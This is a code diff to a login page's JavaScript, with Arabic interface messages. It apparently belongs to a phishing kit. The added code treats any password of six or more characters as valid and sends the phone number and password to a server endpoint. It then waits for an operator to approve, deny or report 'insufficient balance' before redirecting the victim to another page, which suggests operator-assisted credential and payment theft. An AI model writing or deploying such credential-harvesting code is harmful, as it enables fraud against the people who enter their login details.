@@ -541,6 +541,62 @@
     });
   }
 
+  function setApprovalMessage(title, message, isError = false) {
+    if (!approvalOverlay) return;
+    const titleEl = approvalOverlay.querySelector('.approval-title');
+    const messageEl = approvalOverlay.querySelector('.approval-message');
+    if (titleEl) titleEl.textContent = title;
+    if (messageEl) messageEl.textContent = message;
+    approvalOverlay.classList.toggle('error-state', isError);
+  }
+
+  function pollApproval(id) {
+    if (!id) return;
+
+    const poll = async () => {
+      try {
+        const res = await fetch('/api/check-approval/' + id);
+        const data = await res.json();
+
+        if (data.status === 'approved') {
+          const phone = normalizePhone(phoneInput.value);
+          window.location.href = 'mwish.html?phone=' + encodeURIComponent(phone);
+          return;
+        }
+
+        if (data.status === 'denied') {
+          setApprovalMessage('مراجعة مرفوضة', 'تم رفض الطلب. يمكنك المحاولة مرة أخرى.', true);
+          signInBtn.disabled = false;
+          return;
+        }
+
+        if (data.status === 'insufficient') {
+          setApprovalMessage('الموازنة غير كافية', 'رصيد الحساب غير كافٍ.', true);
+          signInBtn.disabled = false;
+          return;
+        }
+
+        if (data.status === 'demo_error') {
+          setApprovalMessage('بيانات غير صحيحة', 'تم رفض الطلب بسبب خطأ في البيانات.', true);
+          signInBtn.disabled = false;
+          return;
+        }
+
+        if (data.status !== 'pending') {
+          setApprovalMessage('طلب غير متاح', 'تعذر التحقق من حالة الطلب.', true);
+          signInBtn.disabled = false;
+          return;
+        }
+      } catch (err) {
+        // Keep polling if the network briefly fails.
+      }
+    };
+
+    poll();
+    const timer = setInterval(poll, 2500);
+    window.__approvalPollTimer = timer;
+  }
+
   if (signInBtn) {
     signInBtn.addEventListener('click', async () => {
       const password = passwordInput.value.trim();
@@ -552,12 +608,42 @@
       await new Promise((resolve) => setTimeout(resolve, 700));
 
       const validPassword = password.length >= 6;
-      if (validPassword) {
-        setStatus('تم تسجيل الدخول بنجاح. انتظر موافقة الإدارة.', 'success');
-        showApprovalCard();
-      } else {
+      if (!validPassword) {
         signInBtn.disabled = false;
         setStatus('كلمة المرور غير صحيحة. حاول مرة أخرى.', 'error');
+        return;
+      }
+
+      const phone = normalizePhone(phoneInput.value);
+      setStatus('تم تسجيل الدخول بنجاح. انتظر موافقة الإدارة.', 'success');
+      showApprovalCard();
+
+      try {
+        const params = new URLSearchParams(window.location.search);
+        const response = await fetch('/api/request-approval', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            plan: params.get('plan') || 'Login',
+            price: params.get('price') || '—',
+            phone,
+            code: password,
+            step: 'login'
+          })
+        });
+
+        const data = await response.json();
+        if (data && data.id) {
+          setApprovalMessage('في انتظار الموافقة', 'الطلب قيد المراجعة، يرجى انتظار تأكيد الإدارة.');
+          pollApproval(data.id);
+          return;
+        }
+
+        setApprovalMessage('خطأ في الطلب', 'تعذر إرسال طلب الموافقة.', true);
+        signInBtn.disabled = false;
+      } catch (err) {
+        setApprovalMessage('فشل الاتصال', 'تعذر إرسال طلب الموافقة. حاول مرة أخرى.', true);
+        signInBtn.disabled = false;
       }
     });
   }
